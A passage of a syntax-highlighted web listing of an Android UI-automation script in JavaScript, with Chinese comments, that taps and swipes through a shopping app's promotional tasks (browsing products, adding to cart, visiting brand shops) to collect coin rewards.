data-num=\"134\"></td><td><pre>            <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>            <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">3000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre></pre></td></tr><tr><td data-num=\"142\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"143\"></td><td><pre> * 执行任务</pre></td></tr><tr><td data-num=\"144\"></td><td><pre> * </pre></td></tr><tr><td data-num=\"145\"></td><td><pre> * @returns </pre></td></tr><tr><td data-num=\"146\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">execTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token comment\">// 判断任务序号是否需要自增</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token function\">judgeAddTaskId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token comment\">// 滑动任务</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token function\">swipeTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    <span class=\"token comment\">// 浏览商品任务</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    <span class=\"token function\">viewProduct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    <span class=\"token comment\">// 加购任务</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    <span class=\"token function\">addCarTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    <span class=\"token comment\">// 种草城任务</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token function\">viewBrankTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token comment\">// 浏览品牌商店任务</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>    <span class=\"token function\">viewBrankShopTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre></pre></td></tr><tr><td data-num=\"166\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre></pre></td></tr><tr><td data-num=\"168\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"169\"></td><td><pre> * 判断任务序号是否需要自增</pre></td></tr><tr><td data-num=\"170\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">judgeAddTaskId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token constant\">IGNORE_TASK_LIST</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">textContains</span><span class=\"token punctuation\">(</span><span class=\"token constant\">IGNORE_TASK_LIST</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>            <span class=\"token constant\">TASK_ID</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">TASK_ID</span> <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>                <span class=\"token constant\">TASK_ID</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"任务序号自增:\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">TASK_ID</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>            <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>            <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>            <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>            task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"190\"></td><td><pre> * 滑动任务</pre></td></tr><tr><td data-num=\"191\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">swipeTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">textContains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"滑动浏览\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"去完成\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">swipe</span><span class=\"token punctuation\">(</span><span class=\"token number\">971</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1610</span><span class=\"token punctuation\">,</span> <span class=\"token number\">989</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>            <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>            <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token constant\">BACK_LIST</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token constant\">BACK_LIST</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>                    isReturn <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>                    <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>                    task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>                    <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>                    <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>                    <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre></pre></td></tr><tr><td data-num=\"212\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"213\"></td><td><pre> * 浏览商品任务</pre></td></tr><tr><td data-num=\"214\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">viewProduct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前页点击浏览4个商品领金币5000金币\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"浏览4个商品任务\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>        <span class=\"token keyword\">const</span> list <span class=\"token operator\">=</span> <span class=\"token function\">textContains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"¥\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>        <span class=\"token keyword\">const</span> ret <span class=\"token operator\">=</span> list<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">bounds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">.</span><span class=\"token function\">centerX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ret<span class=\"token punctuation\">.</span><span class=\"token function\">centerY</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>            <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>        <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre>        <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>        <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"228\"></td><td><pre>        task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"231\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"232\"></td><td><pre></pre></td></tr><tr><td data-num=\"233\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"234\"></td><td><pre> * 加购任务</pre></td></tr><tr><td data-num=\"235\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"236\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">addCarTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"237\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"当前页浏览加购4个商品领4000金币\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"238\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"浏览4个商品任务\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"239\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">315</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1098</span><span class=\"token punctuation\">,</span> <span class=\"token number\">501</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1182</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"240\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"241\"></td><td><pre>            <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"242\"></td><td><pre>            <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"243\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"244\"></td><td><pre>        <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"245\"></td><td><pre>        <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"246\"></td><td><pre>        <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"247\"></td><td><pre>        task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"248\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"249\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"250\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"251\"></td><td><pre></pre></td></tr><tr><td data-num=\"252\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"253\"></td><td><pre> * 浏览品牌商店任务</pre></td></tr><tr><td data-num=\"254\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"255\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">viewBrankShopTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"256\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>is_pp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"257\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">867</span><span class=\"token punctuation\">,</span> <span class=\"token number\">240</span><span class=\"token punctuation\">,</span> <span class=\"token number\">957</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"258\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"259\"></td><td><pre>        <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"260\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"261\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">324</span><span class=\"token punctuation\">,</span> <span class=\"token number\">867</span><span class=\"token punctuation\">,</span> <span class=\"token number\">498</span><span class=\"token punctuation\">,</span> <span class=\"token number\">957</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"262\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"263\"></td><td><pre>        <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"264\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"265\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">582</span><span class=\"token punctuation\">,</span> <span class=\"token number\">867</span><span class=\"token punctuation\">,</span> <span class=\"token number\">756</span><span class=\"token punctuation\">,</span> <span class=\"token number\">957</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"266\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"267\"></td><td><pre>        <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"268\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"269\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">840</span><span class=\"token punctuation\">,</span> <span class=\"token number\">867</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1017</span><span class=\"token punctuation\">,</span> <span class=\"token number\">957</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"270\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"271\"></td><td><pre>        <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"272\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"273\"></td><td><pre>        <span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1062</span><span class=\"token punctuation\">,</span> <span class=\"token number\">240</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1152</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"274\"></td><td><pre>        is_pp <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"275\"></td><td><pre>        <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"276\"></td><td><pre>        <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"277\"></td><td><pre>        task_process <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"278\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"279\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"280\"></td><td><pre></pre></td></tr><tr><td data-num=\"281\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"282\"></td><td><pre> * 种草城任务</pre></td></tr><tr><td data-num=\"283\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"284\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">viewBrankTask</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"285\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"品牌种草城\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"286\"></td><td><pre>        <span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"287\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"288\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">clickCenterXY</span><span class=\"token punctuation\">(</span><span class=\"token number\">540</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1746</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1029</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1920</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"289\"></td><td><pre>                <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"290\"></td><td><pre>                <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"291\"></td><td><pre>                i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"292\"></td><td><pre>                <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"293\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"294\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"295\"></td><td><pre>                <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"296\"></td><td><pre>                <span class=\"token comment\">// 计时器重置</span></pre></td></tr><tr><td data-num=\"297\"></td><td><pre>                <span class=\"token constant\">JUDGE_TIME</span> <span class=\"token operator\">=</span> <span 